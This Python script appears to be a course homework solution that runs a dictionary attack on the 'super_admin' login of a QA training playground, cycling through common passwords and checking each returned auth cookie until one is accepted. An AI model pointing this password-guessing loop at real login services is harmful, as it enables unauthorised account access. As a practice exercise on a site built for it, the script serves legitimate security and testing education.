import requests

passwords = ['1234567890', '1234', '654321', 'dragon', 'sunshine', 'bailey',
              'admin', '121212', 'photoshop', 'donald', '000000', 'mustang',
              'qwertyuiop', '888888', 'ashley', 'superman', 'passw0rd',
              'iloveyou', 'password1', 'loveme', 'abc123', 'hottie', 'qazwsx',
              'whatever', '111111', '666666', 'shadow', 'batman', '!@#$%^&*',
              'trustno1', 'flower', 'master', '1qaz2wsx', 'lovely', '123123',
              '123456789', 'michael', '555555', 'aa123456', 'starwars', 'login',
              'letmein', 'azerty', 'hello', 'welcome', '123qwe', 'solo', '696969',
              '1q2w3e4r  master', 'password', 'charlie', '123456', 'princess',
              'freedom', 'Football', 'zaq1zaq1', 'baseball', 'qwerty123', '7777777',
              'jesus', '12345678', 'monkey', '12345', 'qwerty', 'access', 'football',
              'ninja', '1234567', 'adobe123']

get_password = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

payload = {"login": "super_admin",
           "password": ""}
cookies = {"auth_cookie": ""}

for password in passwords:
    print(f"\nTest password {password}")
    payload.update({"password": password})
    res1 = requests.post(get_password, data=payload)
    # save cookie for check
    cookie_value = res1.cookies.get('auth_cookie')
    cookies.update({"auth_cookie": cookie_value})
    # call check cookie API 
    res2 = requests.post(check_cookie, cookies=cookies)
    if res2.text != "You are NOT authorized":
        print(f"Password {password} is CORRECT\nCookie check response is {res2.text}")
        correct_password = password
    else:
        print(f"Password {password} is WRONG\nCookie check response is {res2.text}")

print(f"\nPassword {correct_password} is CORRECT")
